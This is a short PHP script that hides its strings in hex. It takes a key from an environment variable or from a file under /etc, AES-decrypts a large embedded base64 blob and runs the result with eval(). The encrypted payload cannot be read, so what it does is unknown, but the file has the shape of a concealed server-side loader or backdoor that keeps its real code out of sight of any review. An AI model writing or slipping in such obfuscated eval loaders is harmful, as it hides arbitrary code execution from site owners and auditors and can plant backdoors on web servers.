<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('Mi1THymfysNDwrIhflMAOg==');
$c=base64_decode(
'TLpk6837+8hZGwBaUBVxVv6B7rwTaKlCLzjucoQP5HJ5KzLNeAiDjRkLg056kxOZ7HKHoKpy0EM3' .
'PDv9KTX+BtCq/A0Jq4MWx90GL/ZCJtZp9vAZ41ryC63rgMWnEi8DXZM9g/F0wRPY2k+McPFlkiK3' .
'MD12K1qqVIRBqxKSJTGJc33X7rjd3tJN2ndJG2kgojlKoHnazKb5a1R8oQPVVDmsNFMKibXnP35n' .
'jFLjQ64TEivhsekMgFDSVqpGIkQ2KCSKBZdL7g2k2beKimQ9LE9fD+yt13m3SnE/IzczGVYBQzOh' .
'+YUerOnFiMQJtmDyEVHgDDNgwtbrSjVv2cNmORTnHJTGhsuQB/FCRForyStdaBWQQ9ZaFZd31k6G' .
'o0zkYiGoag68XI5eBK4R/UnxDuK4TZxqPqWX8zrz5jcYg3ZoR4ySWziox4Vu7PDbbhlRWfDMR4Tj' .
'64LUjMyQm4BDeJDBF5o/YfflNUPXNrdztrQ9WsTor3o5nIDbi9KqooM8J7FHDv3W5vt8lTUnS77M' .
'80Cm9B9HvK+bkFNd1u79/AeEE2yuh5ll24QfqAxXt/LeuR3MwHaLBFQHtjSyW8vLkrLBA6LE6J+N' .
'9BDy06ohTOlHaaVFcWz0vjIrFIHHaTH6b8G7PQ0nq+Wn4E/HusUKRO9PoZbuR4HYTbJjuLLCgKqm' .
'6k2yxFpfLZkQOO6cstEOdfjBUUevyUGGH/VEwXwFXTBMZTVxBjw4KMS3HPCam2+QR3/NDbj621Xs' .
'YbK6G9wZPVJqUVMCl2T/XmUaY/REja1ngvfA6FiLqrd1YvT6+XhF0DpPQKeo3Mlp51RQWNdLRGWB' .
'XGQjGazMLfj1hRy2LXsN1rfuiWxIKF4zBCnQN8uIVBvoLPtPnyQXhv3vT9k4V8VgZPUMZSJ9AZeV' .
'VtlgvnHu6j2batqpx9xq46kkifZLGK3TDAscLnFkqJqsWH1RlkeNpR1KQ8GhTxh7+3vh8+bypAnH' .
'+C2nAUAhSMI3YlWPdwaeyLs/BzwfiivhODM/rxBulYZkGKxenrhVvRhRPbvrUCbhPAOApkBqYJy0' .
'2z3eVw4dYUwqApRdBvjc0zXKya7rgTRO0ghvAIx69kmm8/GFezoI44EzKqocyNx4/MlkW5p80Z19' .
'elNXhGCIQerklGKzwF9bAWggGohc+oVtcdN4lxVL0JiHo7i6vLHL1ER/KHJSm5ENcolfswPpoO8H' .
'/tCpYKebir0WWBhTN7NUt/t742NkJxpstK8tB32zlAxpsc9hZSqeDgm71O3kIGcjYfjmUHThXM7P' .
'P1CV0vXucR8ku8ECd2Dskfm9KB2N0SPU9tOcgeTV8dF/Y4o7twCyjpv1/CdVlsHqq4BmIUSyRQ=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
